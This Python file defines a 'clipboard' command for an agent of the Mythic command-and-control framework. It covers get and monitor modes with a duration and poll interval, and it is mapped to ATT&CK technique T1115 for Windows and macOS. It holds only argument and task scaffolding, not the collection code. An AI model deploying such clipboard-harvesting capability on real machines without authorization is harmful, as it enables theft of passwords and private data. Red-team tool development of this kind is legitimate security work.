from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action", cli_name="action",
                display_name="Action",
                type=ParameterType.ChooseOne,
                choices=["get", "monitor"],
                default_value="get",
                description="Clipboard action to perform",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, group_name="Default")
                ]
            ),
            CommandParameter(
                name="duration", cli_name="duration",
                display_name="Duration (seconds)",
                type=ParameterType.Number,
                description="How long to monitor clipboard",
                default_value=60,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default",
                        ui_position=1)
                ]
            ),
            CommandParameter(
                name="interval", cli_name="interval",
                display_name="Poll Interval (seconds)",
                type=ParameterType.Number,
                description="How often to check clipboard",
                default_value=2,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default",
                        ui_position=2)
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

class ClipboardCommand(CommandBase):
    cmd = "clipboard"
    needs_admin = False
    depends_on = None
    plugin_libraries = []
    help_cmd = "clipboard -action get"
    description = (
        "Clipboard operations: get current contents or "
        "monitor for changes"
    )
    version = 1
    author = "@checkymander"
    argument_class = ClipboardArguments
    attackmapping = ["T1115"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows, SupportedOS.MacOS]
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True)
        response.DisplayParams = taskData.args.get_arg("action")
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        pass
